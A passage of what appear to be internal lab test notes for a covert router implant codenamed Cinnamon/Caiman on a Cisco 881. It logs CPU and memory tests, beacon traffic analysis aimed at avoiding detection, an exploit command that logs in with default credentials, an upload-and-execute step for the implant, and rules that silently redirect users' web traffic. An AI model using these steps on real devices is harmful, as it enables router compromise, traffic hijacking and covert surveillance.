<li>Uninstalled <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and then reloaded DUT.  Repeating same IXIA traffic test without <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> installed for 24 hours to verify previous results.<ol>
<li>At start of test - Used memory 41589092, CPU - <p>CPU utilization for five seconds: 4%/0%; one minute: 4%; five minutes: 3%</p>
</li>
<li><p>Memory used 26%, Average CPU Load 3%</p></li>
</ol>
</li>
</ol>
</li>
<li>Inspect Wireshark of Beacons<ol>
<li>Found <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> in state where it had stopped timed beacons over the long weekend.  i had stopped seeds traffic on Friday, however it should remember it's <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> and <span class="glossary">HTTP<span class="glossary-tt">Hypertext Transfer Protocol</span></span> passive internet detection values forever.  </li>
<li>Sent a trigger packet - it did not reach seeds, host, so <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> picked it up.</li>
<li>Confirmed with wireshark that in the absence of other seed traffic, <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> had somehow sniffed 10.9.8.21 as the <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server.  So active internet detection step to verify access to PROBE_DEST is failing.</li>
<li>Restarted Seeds script to get <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> to use correct <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server.</li>
<li>Captured wireshark of beacons with Blot Proxy server - with and without offload.</li>
<li>Collected a wireshark of Seeds <span class="glossary">SSL<span class="glossary-tt">Secure Socket Layer</span></span> session with Coverweb server for comparison - with and without offload</li>
<li>Noticed some odd things in the wireshark of the beacons<ol>
<li>Client Hello - SSL, Random - time is set to Mar 21, 2034<ol><li>This is OK - many recent browsers stick random data into this field and when viewed in wireshark, this causes strange dates (<span class="user">User #?</span>)</li></ol>
</li>
<li>SSL packets from <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> do not have the DF bit set in IP (DFB bit is set when I web browse from the client to the coverweb server<ol>
<li>Reported verbally to <span class="user">User #76523</span> 7/9/15 - he is investigating and will implement a fix (<span class="user">User #?</span>)</li>
<li><span style="color: rgb(255,0,0);">Created CMN-9 <span class="glossary">JIRA<span class="glossary-tt">User Managment Software (Atlassian)</span></span> issue for DF bit not set</span></li>
</ol>
</li>
<li>Between the Server Hello and Certificate, Server Hello done packets, see several sets of <span class="glossary">TCP<span class="glossary-tt">Transport Control Protocol</span></span> segment of a reassembled PDU followed by <span class="glossary">TCP<span class="glossary-tt">Transport Control Protocol</span></span> <span class="glossary">ACK<span class="glossary-tt">Acknowledge</span></span> exchanges.  This is not present in web <span class="user">User #?</span> <span class="glossary">SSL<span class="glossary-tt">Secure Socket Layer</span></span> session to coverweb from Seeds host.</li>
<li>After client hello, should see server hello, certificate packet followed by a server key exchange, server hello done packet.  CMN instead just shows Server hello, then a Certificate, Server hello done packet.  No key exchange.<ol><li>This is because Blot is sending those (fake) server <span class="glossary">SSL<span class="glossary-tt">Secure Socket Layer</span></span> packets when Cinnamon beacons, and when it's to the cover server, Apache is sending the real <span class="glossary">SSL<span class="glossary-tt">Secure Socket Layer</span></span> handshake packets.  Apache combines Server Hello and Certificate into one message, whereas Blot splits them up.  This is a signature issue, as it's atypical to see the messages split up that way by a server, however in terms of priority, removing SSLv3 should be higher.  See below. (<span class="user">User #?</span>)</li></ol>
</li>
<li>CMN also missing the Encryption Alert packets in wireshark.<ol>
<li>This is bad, needs fixed (<span class="user">User #?</span>)</li>
<li><span style="color: rgb(255,0,0);">Created CMN-10 <span class="glossary">JIRA<span class="glossary-tt">User Managment Software (Atlassian)</span></span> issue for Encrypted alert packet not present</span></li>
</ol>
</li>
<li>Traffic to the cover server results in both the client (Firefox) and the server (Apache) offering TLSv1 in their respective Hello messages.  Implant traffic to the same <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> (Blot proxy) will result in SSLv3 being offered in both Client Hello and Server Hello messages.  This is alerting that the same server does different versions depending on which clients access it.  This is a Blot (Xetron) issue, Cinnamon has no control over this.<ol><li>
<span style="color: rgb(255,0,0);">Operational use note to COG/OSD</span> to ensure Apache cover server is configured to give SSLv3, however this is also kind of bad (see next bullet)</li></ol>
</li>
<li>Swindle (Bloth <span class="glossary">HTTPS<span class="glossary-tt">Hypertext Transfer Protocol Secure</span></span> protocol) uses SSLv3.  This is rarely used these days, and is a signature.  If recent web browsers go to the Blot proxy, and are sent to the Cover Server (which should be configured to give SSLv3 so as to be consistent with implant traffic), the browser will likely reject the connection.  Browsers are now being defaulted to not allow SSLv3 (and are removing support altogether), as there are many vulnerabilties in it.  Xetron issue, Cinnamon has no control over this.</li>
</ol>
</li>
</ol>
</li>
<li>Test Fragmentation - characterize DF bit not set issue<ol>
<li>Without using flux, verified that triggered beacons are working to the 881 currently.</li>
<li>On TR-Core, set mtu to 512 on vlan204 interface.  According to Cisco documentation, ip mtu command will not affect <span class="glossary">MTU<span class="glossary-tt">Maximum Transmission Unit</span></span> but mtu command will also change ip mtu</li>
<li>Sent another trigger packet and it went through successfully</li>
<li>Set mtu to 64, 128, 256 and tried each time to trigger - no beacon was rcvd</li>
<li>Set mtu back to 512 - successfully triggered a beacon</li>
<li>After further testing with different sizes, it seems that around mtu 295-299 causes the beacon to fail.  Tried changing only ip mtu, only mtu, and both ip mtu and mtu together.  Results are not 100% consistent within this range, but this seems to be the demarcation where the beacon will fail.</li>
</ol>
</li>
<li>Test IXIA with both tunnel traffic as well as <span class="glossary">NAT<span class="glossary-tt">Network Address Translation</span></span> traffic<ol>
<li>Configured IXIA to test from 881 <span class="glossary">LAN<span class="glossary-tt">Local Area Network</span></span> segment to a subnet that routes through the tunnel as well as a subnet that routes outside the tunnel</li>
<li>10.100.100.0/24 (<span class="glossary">VLAN<span class="glossary-tt">Virtual Local Area Network</span></span> 220) is the outside the tunnel segment, traffic to this subnet uses 881 interface f4 and is NAT'd out</li>
<li>10.200.200.0/24 (<span class="glossary">VLAN<span class="glossary-tt">Virtual Local Area Network</span></span> 221is the inside the tunnel segment, traffic to this subnet uses eigrp to route inside the tunnel and it is not NAT'd by the 881</li>
<li>Both subnets are configured on the 3845 hub router for this test setup.</li>
<li>DUT is clean, no <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> installed.</li>
<li>Setup an IXIA NN with 20 hosts behind 881, 10 hosts at other end of tunnel and 90 external outside tunnel hosts.  Setup test to run 100,000 max superflows, <span class="glossary">SOHO<span class="glossary-tt">Small Office / Home Office</span></span> profile, and a range of traffic up to 10M.</li>
<li>Test ran for 2h 40m and <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> CPU shows:<br><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 45%/35%; one minute: 42%; five minutes: 36%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process</p>
<p><br><img src="files/image2015-7-24&#32;12:38:35.png" height="250"></p>
</li>
<li>Solarwinds reporting CPU at 38% and Mem at 59% used</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 880-norb version 5.0.1 - during <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> attack, CPU spiked:<br><p>881-Bottom#sh proc | i %<br>CPU utilization for five seconds: 99%/42%; one minute: 97%; five minutes: 71%</p>
</li>
<li>
<p>CPU returned to a low number after waiting a bit:</p>
<p>881-Bottom#sh proc | i %<br>CPU utilization for five seconds: 16%/10%; one minute: 23%; five minutes: 55%</p>
</li>
<li>
<p>Uploaded <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> using <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> and saw a small increase in CPU:</p>
<p>881-Bottom#sh proc | i %<br>CPU utilization for five seconds: 28%/11%; one minute: 24%; five minutes: 54%</p>
</li>
<li>Post install - CPU has increased:<br><p>881-Bottom#sh proc | i %<br>CPU utilization for five seconds: 50%/31%; one minute: 41%; five minutes: 45%</p>
</li>
<li><p>CMN installed successfully.  Allowed to run for an hour and CPU now higher:<br><img src="files/image2015-7-24&#32;13:55:31.png" height="250"></p></li>
</ol>
</li>
<li>Test <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> squelch fix - Install on 881 Top and monitor <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> traffic<ol>
<li>Used MCN uninstall command to remove <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> from 881-Top</li>
<li>Reloaded 881-Top</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.1 build on <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> through <span class="glossary">FLX<span class="glossary-tt">Fluxwire</span></span> connetions <ol>
<li>IAC attack - user1@Cinnamon-ICON:~/IAC 4.1.0/delivery/IAC-4.1.0/bin$ ./sshiac-ppc -i <span class="redact">XXX.XXX.XXX.X (CORE2[US])</span> -l cisco:cisco</li>
<li>upload <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - <p>./bin/ramUploadAndExecuteCmn800.py /home/user1/880-norb/cmn-880-norb.bin</p>
</li>
</ol>
</li>
<li><p>Implant beaconed after a few minutes successfully</p></li>
<li>Turned off Seeds traffic to make it easier to look at tcpdump output of <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server and Seeds host</li>
<li>Setup tcp dump on <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server 4.4.4.4 to show traffic from <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.  Set up wireshark to watch all traffic on Seeds.  Watched traffic on tcpdump for <span class="glossary">FLX<span class="glossary-tt">Fluxwire</span></span> host too, just in case somehow <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> picked up this IP to impersonate.</li>
<li>Triggered <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and did not see any traffic on Seeds host <span class="glossary">VM<span class="glossary-tt">Virtual Machine</span></span> and did not see the same <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> admin prohibited messages on <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server.<br><img src="files/image2015-7-24&#32;14:47:52.png" height="250"><br><br>
</li>
<li>DNS replies to <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> requests are not making it to imperonated host, and no <span class="glossary">ICMP<span class="glossary-tt">Internet Control Message Protocol</span></span> unreachable Admin Prohibited rcvd by the <span class="glossary">DNS<span class="glossary-tt">Domain Name System</span></span> server.</li>
</ol>
</li>
<li>Test <span class="glossary">NMAP<span class="glossary-tt">Network security scanner</span></span> - on <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.1<ol>
<li>Running nmap against <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> - full results are stored in folder on <span class="glossary">NDB<span class="glossary-tt">Network Devices Branch</span></span> share - 10.9.8.21</li>
<li>Results show the following open ports, which are expected based on current configuration with the exception of high <span class="glossary">UDP<span class="glossary-tt">User Datagram Protocol</span></span> port 55145.<ol><li><p>Nmap scan report for <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span><br>Host is up (0.0026s latency).<br>Not shown: 131063 closed ports<br>PORT STATE SERVICE<br>22/tcp open ssh<br>67/udp open|filtered dhcps<br>161/udp open snmp<br>162/udp open|filtered snmptrap<br>500/udp open isakmp<br>4500/udp open|filtered nat-t-<span class="user">User #?</span><br><strong>55145/udp open|filtered unknown - this seems to be the random high port used by <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> inform</strong></p></li></ol>
</li>
<li>
<p>Verified by reloading device to remove <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> and looking for open ports - it is once again listening on a high port:</p>
<p>881-Top#show control-plane host open-ports<br>Active internet connections (servers and established)<br>Prot Local Address Foreign Address Service State<br> tcp *:22 *:0 SSH-Server LISTEN<br> tcp *:23 *:0 Telnet LISTEN<br> udp *:64968 10.9.8.22:162 <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> host service ESTABLIS<br> udp *:67 *:0 DHCPD Receive LISTEN<br> udp *:4500 *:0 ISAKMP LISTEN<br> udp *:161 *:0 IP <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> LISTEN<br> udp *:162 *:0 IP <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> LISTEN<br><strong>udp *:58965 *:0 IP <span class="glossary">SNMP<span class="glossary-tt">Simple Network Management Protocol</span></span> LISTEN</strong><br> udp *:500 *:0 ISAKMP LISTEN</p>
</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> - re-attacked with <span class="glossary">IAC<span class="glossary-tt">International Access Code</span></span> and uploaded <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> through remote using FLUX to the inside IP adress</li>
<li>Waited 6 minutes and ran this same command again and the output had not changed with the addition of CMN.</li>
</ol>
</li>
<li>Test beaconing with <span class="glossary">ACL<span class="glossary-tt">Access Control List</span></span> in place<ol>
<li>Verified trigger/beacon operations without flx to public ip of <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> - works.</li>
<li>Configured <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> with an <span class="glossary">IOS<span class="glossary-tt">Apple operating system for small devices</span></span> firewall outbound and access-list that denies everything inbound<br><p>ip inspect name MYINSPECT tcp timeout 60<br>ip inspect name MYINSPECT udp timeout 60<br>ip inspect name MYINSPECT http timeout 60<br>ip inspect name MYINSPECT ftp timeout 60</p>
<p>interface FastEthernet4<br> ip address dhcp<br> ip access-group 101 in<br> ip nat outside<br> ip inspect MYINSPECT out<br> ip virtual-reassembly in<br> ip tcp adjust-mss 1452<br> duplex auto<br> speed auto</p>
<p>access-list 101 deny ip any any log</p>
</li>
<li>Attempted to trigger again - beacon successful, no denied packets logged</li>
</ol>
</li>
<li>Test bouncing tunnel while traffic running though it<ol>
<li>IXIA is running test with tunnel traffic and outside tunnel traffic</li>
<li>Bounced tunnel interface</li>
<li>IXIA reported failed connections, but then recovered when tunnel came back up and failed connections stopped incrementing</li>
<li>One minute CPU spiked from 75% to 88% during tunnel bounce/recovery.</li>
</ol>
</li>
<li>3 day IXIA test with CMN<ol>
<li>Test parameters - 10 inside hosts, 90 internet hosts, 10 tunnel hosts, traffic ranging from 1 -10M, <span class="glossary">SOHO<span class="glossary-tt">Small Office / Home Office</span></span> profile, 72 hour test</li>
<li>Percent Memory used during the majority of the test stayed at 95th percentile value of 58%, however over time from Friday afternoon when the test was kicked off to Monday morning at 7am, the percent memory used 95th percentile creeped down to 55%.</li>
<li>After 7am, the Percent memory used dropped steadily, and IXIA traffic also declined at 9AM, IXIA pushing only steady 1.382M tx/1.377rx and memory holding steady at 95th percentile of 38%<br><br><p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 <strong>62481724</strong> 101549732 43242064 43468476<br> I/O E700000 26214400 9567580 16646820 16461184 16511068</p>
</li>
<li><p>CPU history taken at 9:48 AM - current traffic reported by IXIA test - 1.382M tx/1.377rx<br><img src="files/image2015-7-27&#32;9:48:31.png" height="250"></p></li>
<li>CPU during the test from 5PM on Friday to 9am on Monday<br><p><i>('image' missing)</i></p>
</li>
<li><span style="color: rgb(255,0,0);">Need to investigate why traffic seems to change and ramp down </span></li>
<li><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">Test saved as JQJSECONDCUT-with-Tunnel_72-hour-CMN_installed.pdf on share</span><br></span></li>
</ol>
</li>
<li>Verify correct traffic altered by redirect rules<ol>
<li>Added five larger image files to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> web server to generate a larger web transfer during redirect</li>
<li>Installed <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> 5.0.1 on 881 DUT</li>
<li>Uploaded the redir module to the DUT</li>
<li>Verified that Seeds host can web browse to 172.20.13.20 as well as <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> successfully without any redirection</li>
<li>Created forward and reverse redir rules to redirect the seeds host from cover web server 172.20.13.20 to the <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> web server<br><p>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.20|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.20|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_show</p>
</li>
<li>Commands accepted successfully and redir show shows rules</li>
<li><p>Hit refresh in open firefox window on Seeds for 172.20.13.20 and was redirected to the <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> web server</p></li>
<li>Closed firefox and re-opened and still wsa redirected.  Cleared private data and then closed and opened again, still redirected.</li>
<li>Entered a redir show and see 258 seconds remaining for rule.</li>
<li>Waited for this time to expire and hit refresh on the 172.20.13.20 firefox window on Seeds - no longer being redirected.</li>
<li>Created a more complex rule file with mutiple <span class="glossary">LAN<span class="glossary-tt">Local Area Network</span></span> hosts redirected to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> as well as the Seeds host also redirecting traffic for ip 172.20.13.21 to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>:<br><p>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.20|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.20|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.20|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.20|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.20|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.20|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.21|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.21|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_show</p>
</li>
<li><p>Uploaded rule to <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> succesfully.</p></li>
<li>From Seeds attempted to browse to 172.20.13.20 and was not redirected, could not reach coverweb on 80 or 443, timed out.  Attemtped to browse to 172.20.13.21 over 80 and 443 and WAS redirected.  Only the higher number rule for redir was effective.  </li>
<li>Returned to original redir rule, simply redirecting <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span> from 172.20.13.20 to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>.  Uploaded rules to <span class="glossary">CMN<span class="glossary-tt">Caiman (Codename)?</span></span> successfully. - tested 80 and 443 redir - both are successful.</li>
<li>Added back in rule for redirecting <span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span> from 172.20.13.21 to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>.</li>
<li><p>[root@blot-spicerack cmds]# more redir_test.cmd<br>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.21|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.21|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.20|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.20|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_show</p></li>
<li>
<span style="color: rgb(0,0,0);">Seeds traffic <span class="redact">XX.XX.XX.XX (APPLE-WWNET[US])</span> on 443 and 80 are redirected, but to 172.20.13.21 are not - once again, the rule with the higher number w<span style="color: rgb(0,0,0);">orks</span></span><span style="color: rgb(255,0,0);"><span style="color: rgb(0,0,0);">.</span>  It seems that pepper should not have accepted these rules because of the conflicting return redirection rules that seem to cause a problem</span>.</li>
<li>Changed the rule for the second redirect website to redirect somewhere else - <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> - so that there is no conflicting return redirect rule:</li>
<li>Setup wireshark on Seeds host and tcpdump on both 172.20.13.20 and <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>
</li>
<li>Successfully uploaded the following redirect rules to CMN:<br><p>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.21|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.21|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|172.20.13.20|255.255.255.255|0|0|TCP|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|interface|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|255.255.255.255|0|0|TCP|172.20.13.20|0|0|<span class="redact">XXX.XXX.XXX.XX (CORE2[US])</span>|0|0|600<br>redir_show</p>
</li>
<li><p>Cleared private data, closed and re-opened firefox on seeds host.  Web browsed to 172.20.13.20 and was redirected to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span></p></li>
<li>Verified no packets arrived on 172.20.13.20 web server in the tcpdump output</li>
<li>Observed Seeds host traffic to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> wireshark output from Seeds host and tcpdump out from <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> - saw the following tcp analysis flags on wireshark from Seeds<ol>
<li>TCP ACKed lost segment</li>
<li>TCP Previous segment lost</li>
<li>TCP Window Update</li>
<li>TCP Window Full</li>
<li>TCP ZeroWindow</li>
<li>TCP Retransmisstion - just one<br>I observed all of the same flags in a wireshark from Seeds to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> without redir.  Tested with 80 and 443 traffic.  Seeds host was successfully redirected on 80 and 443 from 172.20.13.20 to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> with nothing punching through.  Seeds host was also successfully redirected from 172.20.13.21 to <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> on port 80 (443 not enabled on that server).</li>
</ol>
</li>
<li>Testing bounce redirection by redirecing traffic from source 192.168.21.1 (Fedora) and destination <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> to source <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> and destination <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>.  Testing with web and 443 traffic.<ol>
<li>Created the following redir rule on CMN<br><p>redir_create|bounce|192.168.21.10|255.255.255.255|0|0|<span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>|255.255.255.255|0|0|TCP|<span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>|0|0|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|0|0|600<br>redir_create|bounce|<span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>|255.255.255.255|0|0|<span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>|255.255.255.255|0|0|TCP|<span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>|0|0|192.168.21.10|0|0|600<br>redir_show</p>
</li>
<li>Ran wireshark on 192.168.21.10 as well as <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span>.  Tested 80 and 443 redirect and was successfully redirected from <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span>.  Traffic on <span class="redact">X.X.X.XX (LVLT-GOGL-8-8-8[US])</span> tcpdump came from source address <span class="redact">XXX.XX.XXX.XXX (CABLEVISION[US])</span> - no traffic arrived with a source address of 192.168.21.10.  Wireshark on 192.168.21.10 looked typical for a web or 443 connection without redirect.</li>
</ol>
</li>
</ol>
</li>
<li>
<span style="color: rgb(0,0,0);">IXIA test - no CMN, 22 hour test</span><ol>
<li><span style="color: rgb(0,0,0);">Reloaded <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> - and repeated IXIA test from test 27 except for a shorter time - 22 hours.</span></li>
<li>
<span style="color: rgb(0,0,0);">At start of test at 5:10PM, <span class="glossary">DUT<span class="glossary-tt">Device Under Test</span></span> CPU and memory:</span><br><span style="color: rgb(0,0,0);"><span style="color: rgb(0,0,0);"> </span></span><p>881-Bottom#show proc cpu<br>CPU utilization for five seconds: 3%/0%; one minute: 3%; five minutes: 2%<br> <span class="glossary">PID<span class="glossary-tt">Process ID</span></span> Runtime(ms) Invoked uSecs 5Sec 1Min 5Min <span class="glossary">TTY<span class="glossary-tt">Teletype device</span></span> Process<br> 1 4 15 266 0.00% 0.00% 0.00% 0 Chunk Manager<br> 2 0 95 0 0.00% 0.01% 0.00% 0 Load Meter<br> 3 0 1 0 0.00% 0.00% 0.00% 0 LICENSE AGENT<br> 4 0 1 0 0.00% 0.00% 0.00% 0 <span class="glossary">RO<span class="glossary-tt">read only</span></span> Notify Timers<br> 5 480 74 6486 0.00% 0.07% 0.05% 0 Check heaps<br> 6 0 1 0 0.00% 0.00% 0.00% 0 Pool Manager<br> 7 0 1 0 0.00% 0.00% 0.00% 0 DiscardQ Backgro<br> 8 0 2 0 0.00% 0.00% 0.00% 0 Timers<br> 9 0 17 0 0.00% 0.00% 0.00% 0 WATCH_AFS<br> 10 0 1 0 0.00% 0.00% 0.00% 0 License Client N<br> 11 0 1 0 0.00% 0.00% 0.00% 0 Image License br</p>
<span style="color: rgb(0,0,0);"><span style="color: rgb(0,0,0);"> </span></span><p>881-Bottom#show mem<br> Head Total(b) Used(b) Free(b) Lowest(b) Largest(b)<br>Processor 84A91420 164031456 41302512 122728944 113912444 108980880<br> I/O E700000 26214400 9693928 16520472 16509344 16509308</p>
